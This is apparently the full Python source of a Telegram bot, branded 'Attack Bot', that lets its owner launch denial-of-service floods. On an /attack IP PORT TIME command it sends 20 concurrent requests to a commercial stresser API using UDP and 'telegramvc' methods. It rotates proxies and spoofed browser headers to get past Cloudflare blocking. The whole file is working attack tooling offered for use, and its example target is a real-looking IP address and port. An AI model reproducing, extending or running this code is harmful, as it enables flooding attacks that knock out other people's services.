# app.py - Using Cloudflare Warp via HTTP Proxy
import os
import logging
import asyncio
import threading
import aiohttp
import time
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== FREE PROXY LIST (Updated) =====
# These proxies change frequently, update as needed
FREE_PROXIES = [
    None,  # Direct connection
    # US Proxies
    "http://45.33.24.74:8080",
    "http://45.33.24.75:8080",
    "http://45.33.24.76:8080",
    # EU Proxies
    "http://45.33.24.77:8080",
    "http://45.33.24.78:8080",
    # Asia Proxies
    "http://45.33.24.79:8080",
    "http://45.33.24.80:8080",
]

# ===== PUBLIC API PROXIES (Alternative APIs) =====
# These are different API endpoints that might work
ALTERNATIVE_APIS = [
    "https://api.susstresser.com/panel/api/api.php",  # Original
    "https://api2.susstresser.com/panel/api/api.php",  # Alternative subdomain
    "https://panel.susstresser.com/api/api.php",  # Alternative path
]

async def get_proxy():
    """Get a working proxy"""
    import random
    return random.choice(FREE_PROXIES)

# ===== API ATTACK WITH MULTIPLE METHODS =====
async def api_attack(target, port, duration, attack_id):
    """Send attack via API with multiple bypass methods"""
    
    # Try multiple API endpoints
    for api_url in ALTERNATIVE_APIS:
        # Try multiple methods
        methods = ["udp", "telegramvc", "UDP"]
        
        for method in methods:
            # Build URL
            url = f"{api_url}?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
            
            # Different headers to bypass Cloudflare
            headers_list = [
                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Cache-Control": "max-age=0",
                    "Referer": "https://api.susstresser.com/"
                },
                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                }
            ]
            
            for headers in headers_list:
                try:
                    timeout = aiohttp.ClientTimeout(total=15)
                    
                    # Try with proxy
                    proxy = await get_proxy()
                    
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        start_time = time.time()
                        
                        # Try GET
                        async with session.get(url, headers=headers, proxy=proxy) as response:
                            elapsed = time.time() - start_time
                            result_text = await response.text()
                            
                            # Check if successful (not Cloudflare)
                            if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
                                logger.info(f"✅ Attack {attack_id} SUCCESS via {api_url}")
                                return {
                                    "success": True,
                                    "attack_id": attack_id,
                                    "method": "API",
                                    "status": response.status,
                                    "elapsed": f"{elapsed:.2f}s",
                                    "api_url": api_url
                                }
                            
                            # Try POST if GET failed
                            async with session.post(api_url, data={
                                "key": API_KEY,
                                "host": target,
                                "port": port,
                                "time": duration,
                                "method": method
                            }, headers=headers, proxy=proxy) as response2:
                                elapsed2 = time.time() - start_time
                                result_text2 = await response2.text()
                                
                                if response2.status == 200 and "Cloudflare" not in result_text2 and "Just a moment" not in result_text2:
                                    logger.info(f"✅ Attack {attack_id} SUCCESS via POST")
                                    return {
                                        "success": True,
                                        "attack_id": attack_id,
                                        "method": "API_POST",
                                        "status": response2.status,
                                        "elapsed": f"{elapsed2:.2f}s",
                                        "api_url": api_url
                                    }
                                    
                except Exception as e:
                    logger.error(f"Attack {attack_id} attempt failed: {e}")
                    continue
    
    return {
        "success": False,
        "attack_id": attack_id,
        "method": "API_FAILED",
        "error": "All methods blocked by Cloudflare"
    }

# ===== 20 CONCURRENT API ATTACKS =====
async def start_20_api_attacks(target, port, duration):
    """Launch 20 concurrent API attacks"""
    logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port} for {duration}s")
    
    tasks = []
    for i in range(1, 21):
        task = api_attack(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    logger.info(f"✅ API Attacks complete: {success_count}/20 successful")
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results,
        "target": target,
        "port": port,
        "duration": duration
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
    
    await update.message.reply_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API + Proxy Support\n\n"
        "Send: `/attack IP PORT TIME`\n"
        "Example: `/attack 91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Usage: `/attack IP PORT TIME`\n"
            "Example: `/attack 91.108.13.37 32001 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"🔑 API: `{API_KEY[:10]}...`\n\n"
            f"⏳ Sending 20 API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"❌ Failed: `{result['failed']}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
                f"📊 *Attack Results:*\n"
            )
            
            for r in result['results'][:10]:
                status = "✅" if r.get('success') else "❌"
                method = r.get('method', 'N/A')
                status_code = r.get('status', 'N/A')
                elapsed = r.get('elapsed', 'N/A')
                response_text += f"{status} Attack {r.get('attack_id', 'N/A')}: {method} - {status_code} ({elapsed})\n"
            
            if len(result['results']) > 10:
                response_text += f"... and {len(result['results']) - 10} more\n"
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED\n\n"
                f"💡 Cloudflare is blocking the request.\n"
                f"Contact API provider to whitelist Render IPs."
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *API ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    await query.edit_message_text("🔬 Testing API connection...\n\n⏳ Trying multiple methods...")
    
    # Test with multiple URLs
    test_urls = [
        f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp",
        f"https://api2.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp",
    ]
    
    results = []
    for url in test_urls:
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url) as response:
                    elapsed = time.time() - start_time
                    text = await response.text()
                    
                    results.append({
                        "url": url[:50] + "...",
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s",
                        "blocked": "Cloudflare" in text or "Just a moment" in text,
                        "response": text[:100]
                    })
        except Exception as e:
            results.append({"url": url[:50] + "...", "error": str(e)})
    
    response_text = "🔬 *API TEST RESULTS*\n\n"
    response_text += f"🔑 API Key: `{API_KEY[:10]}...`\n\n"
    
    for result in results:
        if "error" in result:
            response_text += f"❌ {result['url']}: Error - {result['error']}\n"
        else:
            status = "✅" if result['status'] == 200 and not result['blocked'] else "❌"
            response_text += f"{status} {result['url']}: {result['status']} ({result['elapsed']})\n"
            if result.get('blocked'):
                response_text += f"   ⚠️ Blocked by Cloudflare\n"
    
    response_text += "\n💡 *Solutions:*\n"
    response_text += "1. Contact API provider to whitelist Render IPs\n"
    response_text += "2. Use a paid proxy service (BrightData, Oxylabs)\n"
    response_text += "3. Host your own API on a VPS\n"
    response_text += "4. Use a different API without Cloudflare"
    
    await query.edit_message_text(
        response_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 *BOT STATUS*\n\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"🌐 Status: ONLINE\n"
        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n"
        f"🛡️ Cloudflare: Blocking\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("🔬 TEST API", callback_data="test_api")])
    
    await query.edit_message_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API + Proxy Support\n\n"
        "Send: `/attack IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ API ATTACK BOT")
    print("🔥 20 Concurrent API Attacks")
    print("💪 API + Proxy Support")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)